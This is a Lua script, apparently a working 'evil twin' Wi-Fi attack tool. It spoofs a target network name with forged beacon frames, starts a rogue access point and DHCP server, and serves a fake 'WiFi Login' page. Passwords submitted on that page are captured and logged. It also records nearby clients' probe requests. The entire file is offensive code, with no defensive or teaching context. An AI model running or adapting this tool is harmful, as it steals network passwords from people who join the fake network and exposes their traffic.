local iface, ssid = arg[1], arg[2]
local channel = tonumber(arg[3]) or 6
local bssid = arg[4]
if not bssid then math.randomseed(os.time()); bssid=string.format("02:%02x:%02x:%02x:%02x:%02x",math.random(0,255),math.random(0,255),math.random(0,255),math.random(0,255),math.random(0,255)) end

local function je(s) return '"'..tostring(s):gsub('\\','\\\\'):gsub('"','\\"'):gsub('\n','\\n'):gsub('\r','\\r')..'"' end
local function tel(e,d)
  io.write('{"event":'..je(e)..',"iface":'..je(iface)..',"bssid":'..je(bssid)..',"ssid":'..je(ssid)..',"channel":'..tostring(channel)..',"data":'..d..',"timestamp":'..je(tostring(os.time()))..'}\n')
  io.flush()
end

local function mon()
  local f=io.popen("iw dev "..iface.." info 2>/dev/null"); if not f then return false end
  local o=f:read("*a"); f:close()
  if o:find("type monitor") then tel("monitor_ok",'{}') return true end
  tel("monitor_fail",'{}') return false
end

local portal="HTTP/1.1 200 OK\r\nContent-Type:text/html\r\nConnection:close\r\n\r\n<!DOCTYPE html><html><head><title>WiFi Login</title><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:Arial;text-align:center;margin:50px;background:#f5f5f5}.card{background:#fff;padding:30px;border-radius:10px;max-width:400px;margin:0 auto}input{width:100%;padding:10px;margin:8px 0;border:1px solid #ddd;border-radius:5px}button{background:#4CAF50;color:#fff;padding:12px 20px;border:none;border-radius:5px;width:100%}</style></head><body><div class=card><h2>WiFi Login</h2><form method=POST action=/login><input type=password name=password placeholder='Password' required><button type=submit>Connect</button></form></div></body></html>"

local function airbase()
  tel("airbase",'{"ssid":'..je(ssid)..',"bssid":'..je(bssid)..',"ch":'..tostring(channel)..'}')
  os.execute("airbase-ng -e "..ssid.." -c "..tostring(channel).." -a "..bssid.." -W 1 "..iface.." 2>/dev/null &")
  tel("airbase_ok",'{"msg":"started"}')
end

local function dhcp()
  local cfg="interface=at0\ndhcp-range=10.0.0.2,10.0.0.100,255.255.255.0,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
  local f=io.open("/tmp/edhcp.conf","w")
  if f then f:write(cfg); f:close()
    os.execute("ifconfig at0 10.0.0.1 netmask 255.255.255.0 up 2>/dev/null")
    os.execute("dnsmasq -C /tmp/edhcp.conf -d 2>/dev/null &")
    tel("dhcp_ok",'{"gw":"10.0.0.1"}')
  else tel("dhcp_fail",'{}') end
end

local function httpd()
  tel("httpd_start",'{}')
  local ok, sock = pcall(require,"socket")
  if not ok then
    os.execute("iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:8080 2>/dev/null")
    return nil,nil
  end
  local s,e=sock.tcp() if not s then return nil,nil end
  s:setoption("reuseaddr",true); local ok,e=s:bind("0.0.0.0",80)
  if not ok then s:close() return nil,nil end
  s:listen(10); s:settimeout(0.5); tel("httpd_listen",'{"port":80}')
  local function h(c)
    local r=c:receive("*l") if not r then c:close() return end
    local m,p=r:match("^(%w+)%s+(/%S*)")
    if m=="POST" and p=="/login" then
      local hd={}
      while true do local l=c:receive("*l"); if not l or l=="" then break end
        local k,v=l:match("^([^:]+):%s*(.+)$"); if k then hd[k:lower()]=v end end
      local cl=tonumber(hd["content-length"] or 0)
      local body=""; if cl>0 then body=c:receive(cl) end
      local pw=body and body:match("password=([^&]+)") or ""
      if pw then pw=pw:gsub("%%(%x%x)",function(h) return string.char(tonumber(h,16)) end) end
      tel("creds",'{"password":'..je(pw)..',"raw":'..je(body or "")..'}')
      c:send("HTTP/1.1 302 Found\r\nLocation: http://10.0.0.1/\r\nContent-Length:0\r\nConnection:close\r\n\r\n")
    else
      c:send(portal)
    end
    c:close()
  end
  return s,h
end

local function beacon_flood()
  tel("bf_start",'{"ssid":'..je(ssid)..'}')
  os.execute("iw dev "..iface.." set channel "..tostring(channel).." 2>/dev/null")
  local frm=string.char(0x80,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff)
  for b in bssid:gmatch("(%x%x)") do frm=frm..string.char(tonumber(b,16)) end
  for b in bssid:gmatch("(%x%x)") do frm=frm..string.char(tonumber(b,16)) end
  frm=frm..string.char(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x64,0x00,0x31,0x04,0x00)
  local sl=#ssid>32 and 32 or #ssid; frm=frm..string.char(sl)..ssid:sub(1,sl)
  frm=frm..string.char(0x01,0x08,0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24,0x03,0x01,channel)
  local rsn=string.char(0x01,0x00,0x00,0x0f,0xac,0x02,0x01,0x00,0x00,0x0f,0xac,0x04,0x01,0x00,0x00,0x0f,0xac,0x02,0x00,0x00)
  frm=frm..string.char(0x30,#rsn)..rsn
  local f=io.open("/tmp/ebeacon_"..iface..".bin","wb")
  if f then f:write(frm); f:close() end
  os.execute("cat /tmp/ebeacon_"..iface..".bin | aireplay-ng -D "..iface.." 2>/dev/null &")
end

local function monitor(s,h)
  os.execute("airodump-ng "..iface.." -c "..tostring(channel).." -w /tmp/eprobe 2>/dev/null &")
  local start=os.time()
  while os.time()-start<120 do
    if s and h then local c,e=s:accept(); if c then h(c) end end
    local f=io.open("/tmp/eprobe-01.csv","r")
    if f then for l in f:lines() do
        if l:find("Probe") then
          local p_ssid=l:match("Probe%s+(.+)$"); local src=l:match("([%x:]+)%s+")
          if p_ssid and src then tel("probe",'{"client":'..je(src)..',"ssid":'..je(p_ssid)..'}') end
        end
      end f:close() end
    os.execute("sleep 2")
  end
  os.execute("pkill -f 'airodump-ng "..iface.."' 2>/dev/null")
  if s then s:close() end
end

if not iface or not ssid then tel("error",'{"err":"Usage: evil_twin.lua <iface> <ssid> [ch] [bssid]"}') os.exit(1) end
if not mon() then tel("error",'{"err":"monitor required"}') os.exit(1) end
tel("start",'{"ssid":'..je(ssid)..',"bssid":'..je(bssid)..',"ch":'..tostring(channel)..'}')
beacon_flood(); os.execute("sleep 2"); airbase(); os.execute("sleep 3"); dhcp(); os.execute("sleep 2")
local s,h=httpd()
tel("ready",'{"msg":"rogue AP running","ssid":'..je(ssid)..'}')
monitor(s,h)
tel("complete",'{"msg":"finished"}')
